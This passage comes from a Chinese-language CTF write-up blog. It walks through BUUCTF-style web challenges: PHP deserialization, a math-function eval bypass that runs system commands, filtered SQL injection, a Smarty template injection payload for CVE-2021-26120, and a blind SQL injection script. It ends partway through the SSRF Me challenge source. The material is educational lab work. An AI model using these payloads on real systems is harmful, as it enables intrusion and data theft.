class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&quot;phpinfo()&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="string">&quot;assert&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$a</span> = <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">        <span class="variable">$b</span> = <span class="variable language_">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$b</span>(<span class="variable">$a</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title class_">HelloPhp</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$c</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//if(isset($_GET[&#x27;source&#x27;]))&#123;highlight_file(__FILE__);die(0);&#125;@$ppp = unserialize($_GET[&quot;data&quot;]); </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>​    </p><h2 id="CISCN-2019-初赛-Love-Math"><a href="#CISCN-2019-初赛-Love-Math" class="headerlink" title="[CISCN 2019 初赛]Love Math"></a>[CISCN 2019 初赛]Love Math</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$content</span>) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;太长了不会算&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$content</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    <span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="variable">$content</span>, <span class="variable">$used_funcs</span>);  </span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$used_funcs</span>[<span class="number">0</span>] <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$func</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$content</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里和ctfshow里面的一道题几乎一模一样，就是考查利用函数的转化来进行做题</p><p><strong>就是使用GET逃逸来进行做题</strong></p><p>80个字符比较少，想办法构造<script type="math/tex">_GET[1]`再传参getflag，但是其实发现构造这个好像更难。。。因为`</script>、<code>_</code>、<code>[</code>、<code>]</code>都不能用，同时<code>GET</code>必须是大写，很难直接构造。</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pi</span>=<span class="title function_ invoke__">base_convert</span>(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(<span class="title function_ invoke__">dechex</span>(<span class="number">1598506324</span>));(<span class="variable">$$pi</span>)&#123;pi&#125;((<span class="variable">$$pi</span>)&#123;abs&#125;)&amp;pi=system&amp;abs=tac flag.php</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">base_convert(37907361743,10,36) =&gt; &quot;hex2bin&quot; </span><br><span class="line">dechex(1598506324) =&gt; &quot;5f474554&quot; </span><br><span class="line">$pi=hex2bin(&quot;5f474554&quot;) =&gt; $pi=&quot;_GET&quot;   //hex2bin将一串16进制数转换为二进制字符串 </span><br><span class="line">($$pi)&#123;pi&#125;(($$pi)&#123;abs&#125;) =&gt; ($_GET)&#123;pi&#125;($_GET)&#123;abs&#125;  //&#123;&#125;可以代替[]</span><br></pre></td></tr></table></figure><p><a href="https://johnfrod.top/ctf/%E5%88%A9%E7%94%A8%E6%95%B0%E5%AD%A6%E5%87%BD%E6%95%B0%E6%9E%84%E9%80%A0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">四种方法</a></p><h2 id="SWPU2019-Web1-sql注入"><a href="#SWPU2019-Web1-sql注入" class="headerlink" title="[SWPU2019]Web1(sql注入)"></a>[SWPU2019]Web1(sql注入)</h2><p>题目</p><p><img src="../images/image-20230410164651863.png" alt="image-20230410164651863"></p><p>一个登录框</p><p>这里尝试进行注册后，发现admin用户已经存在，所以就尝试自己注册一个账号进行登录</p><p><img src="../images/image-20230410164906595.png" alt="image-20230410164906595"></p><p>登录界面</p><p>用万能密码进行测试的时候发现</p><p><img src="../images/image-20230410165107656.png" alt="image-20230410165107656"></p><p>fuzz测试结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">空格被替换为空</span><br><span class="line">or</span><br><span class="line">and</span><br><span class="line">join</span><br><span class="line">--+</span><br><span class="line">#</span><br><span class="line">updatexml</span><br><span class="line">extractvalue</span><br><span class="line">exp</span><br><span class="line">floor</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>所以不能用注释之后，我们就尝试进行闭合</p><p><img src="../images/image-20230410165855329.png" alt="image-20230410165855329"></p><p>先需要判断有多少字段，<code>order by</code>不能使用，可以使用<code>group by</code>或者<code>into @a, @b, @c, ...</code></p><p>发布广告（’ or 1=1）进行尝试，进行测试时发现空格、or、#、—+、and等进行了过滤，目前基本可以确定注入点在这个地方，在进行注入的时候我们需要先判断列数，payload：1’/<strong>/group/</strong>/by/**/n,’，n为整数（因为对or进行了过滤，导致order无法使用，因此这里才采用group by来确定列数），最终得到n为22，结果如下：</p><p><img src="../images/image-20230410170426061.png" alt="image-20230410170426061"></p><p>发现一共有23列，那么我们就尝试一下看哪有回显</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&amp;&amp;&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230410170529355.png" alt="image-20230410170529355"></p><p>发现23位置有回显，那么我们就利用这两个位置来进行查询</p><p><strong>查数据库</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">title=&#x27;union/**/select/**/1,database(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230410171102690.png" alt="image-20230410171102690"></p><p>查出数据库名，因为or被过滤了</p><p>查表名，因为这里过滤<code>or</code>所以也无法使用<code>information_schema</code>表，也没有<code>sys</code>表，所以使用<code>mysql.innodb_table_stats</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">title=&#x27;union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;22&amp;content=mochu7&amp;ac=add</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230410171219143.png" alt="image-20230410171219143"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8、进行匿名获取flag值，payload：1&#x27;/**/union/**/select/**/1,(select/**/group_concat(c)/**/from/**/(select/**/1/**/as/**/a,2/**/as/**/b,3/**/as/**/c/**/union/**/select/**/*/**/from/**/users)n),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&amp;&amp;&#x27;1&#x27;=&#x27;1，或者payload：1&#x27;/**/union/**/select/**/1,(select/**/group_concat(`3`)/**/from/**/(select/**/1,2,3/**/union/**/select/**/*/**/from/**/users)n),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&amp;&amp;&#x27;1&#x27;=&#x27;1，其中group_concat(参数)，对参数进行修改，访问每一个字段，结果如下：</span><br></pre></td></tr></table></figure><p>这里有一个小知识点就是group_concat(`3`)里的3和外面查询的别名是一样的，就是</p><p>3必须是表里必须有三列，然后必须早select 1，2，3xxx这里进行查询</p><p><img src="../images/image-20230410173317416.png" alt="image-20230410173317416"></p><p>本地也进行测试过了</p><p><img src="../images/image-20230410173337170.png" alt="image-20230410173337170"></p><h2 id="CISCN2019-华东南赛区-Web11"><a href="#CISCN2019-华东南赛区-Web11" class="headerlink" title="[CISCN2019 华东南赛区]Web11"></a>[CISCN2019 华东南赛区]Web11</h2><p>题目</p><p><img src="../images/image-20230410173453240.png" alt="image-20230410173453240"></p><p><img src="../images/image-20230410174811347.png" alt="image-20230410174811347"></p><p>题目中也有XFF，然后请求头中并没有，所以我们尝试抓包看看</p><p>发现没有，然后添加查看，发现这里可以进行回显</p><p><img src="../images/image-20230410175020518.png" alt="image-20230410175020518"></p><p>这里和之前的一道题很像，就是利用这里来进行命令执行，但是之前的题是ssti的，并且是一个模板的rce</p><p>所以我们就猜测这里会不会也是考模板的ssti</p><p><img src="../images/image-20230410175234890.png" alt="image-20230410175234890"></p><p>对这个玩意眼熟吧</p><p><img src="../images/image-20230410175258323.png" alt="image-20230410175258323"></p><p>于是就去找这个模板的rce</p><p><a href="https://www.venustech.com.cn/new_type/aqtg/20210226/22409.html">文章wp</a></p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string:&#123;$s=$smarty.template_object-&gt;smarty&#125;&#123;$fp=$smarty.template_object-&gt;compiled-&gt;filepath&#125;&#123;Smarty_Internal_Runtime_WriteFile::writeFile($fp,&quot;&lt;?php+phpinfo();&quot;,$s)&#125;</span><br></pre></td></tr></table></figure><p>得执行两次才行</p><p><img src="../images/image-20230410175551036.png" alt="image-20230410175551036"></p><p><img src="../images/image-20230410175712890.png" alt="image-20230410175712890"></p><p>还是点两次发送就行</p><p><img src="../images/image-20230410175728695.png" alt="image-20230410175728695"></p><p><strong>CVE-2021-26120</strong></p><h2 id="极客大挑战-2019-FinalSQL"><a href="#极客大挑战-2019-FinalSQL" class="headerlink" title="[极客大挑战 2019]FinalSQL"></a>[极客大挑战 2019]FinalSQL</h2><p>题目</p><p><img src="../images/image-20230410194457013.png" alt="image-20230410194457013"></p><p>这里进行了简单的提示</p><p>就是考察的是sql盲注</p><p>提示很明显，需要SQL盲注<br>这道题的注入点不是登录框，而是上面的数字按钮<br>在登录框测试能否注入的时候，返回值没有显示错误</p><p><img src="../images/image-20230410194738135.png" alt="image-20230410194738135"></p><p>注入点在上面的数字处，那里才是注入点</p><p><img src="../images/image-20230410194911976.png" alt="image-20230410194911976"></p><p><strong>paylaod</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://e4247cff-5d64-4353-b875-e07e478c50bf.node3.buuoj.cn/search.php&quot;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> low &lt; high:</span><br><span class="line">        mid = (low+high)//<span class="number">2</span></span><br><span class="line">        <span class="comment"># 中间的语句为真，网页不报错，中间的语句为假，网页报错，根据这个判断</span></span><br><span class="line">        <span class="comment"># 查数据库</span></span><br><span class="line">        database = <span class="string">&quot;?id=1^(ord(substr((select(database())),%d,1))&gt;%d)^1&quot;</span> % (i, mid)</span><br><span class="line">        <span class="comment"># 查表</span></span><br><span class="line">        tables = <span class="string">&quot;?id=1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#x27;geek&#x27;),%d,1))&gt;%d)^1&quot;</span>%(i,j)</span><br><span class="line">        columns = <span class="string">&quot;?id=1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;F1naI1y&#x27;)),%d,1))&gt;%d)^1&quot;</span>%(i,j)</span><br><span class="line">        data = <span class="string">&quot;?id=1^(ord(substr((select(group_concat(password))from(F1naI1y)),%d,1))&gt;%d)^1&quot;</span> % (i, j)</span><br><span class="line">        <span class="comment"># 根据需要查询的内容改变get中的参数</span></span><br><span class="line">        r = requests.get(url=url+database)</span><br><span class="line">        <span class="comment"># print(url+database)</span></span><br><span class="line">        <span class="comment"># print(payload1)</span></span><br><span class="line">        <span class="comment"># print(r.raw)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Click&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        <span class="comment"># print(low,mid,high)</span></span><br><span class="line">    flag += <span class="built_in">chr</span>(low)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>记得不知道过滤啥的时候进行抓包fuzz测试一下</p><h2 id="BSidesCF-2019-Futurella"><a href="#BSidesCF-2019-Futurella" class="headerlink" title="[BSidesCF 2019]Futurella"></a>[BSidesCF 2019]Futurella</h2><p>题目</p><p><img src="../images/image-20230410195215842.png" alt="image-20230410195215842"></p><p><img src="../images/image-20230410195245734.png" alt="image-20230410195245734"></p><p>查看源码就行</p><h2 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h2><p>题目</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Task</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, action, param, sign, ip</span>):</span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.xists(self.sandbox)):          <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Exec</span>(<span class="params">self</span>):</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"></span><br><span class="line">                resp = scan(self.param)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">&quot;Connection Timeout&quot;</span>):</span><br><span class="line"></span><br><span class="line">                    result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line"></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">                    <span class="built_in">print</span> resp</span><br><span class="line"></span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line"></span><br><span class="line">                    tmpfile.close()</span><br><span class="line"></span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line"></span><br><span class="line">                f = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line"></span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line"></span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = f.read()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line"></span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line"></span><br><span class="line">            result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">checkSign</span>(<span class="params">self</span>):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/geneSign&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">geneSign</span>():</span><br><span class="line"></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>)) <span class="comment">#urllib.unquote 是url解码   ----urlib.urlencode 是url编码  #request.args.get获取单个值</span></span><br><span class="line"></span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/De1ta&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge</span>():</span><br><span class="line"></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line"></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line"></span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line"></span><br><span class="line">    ip = request.remote_addr <span class="comment">#获取request的ip</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line"></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span 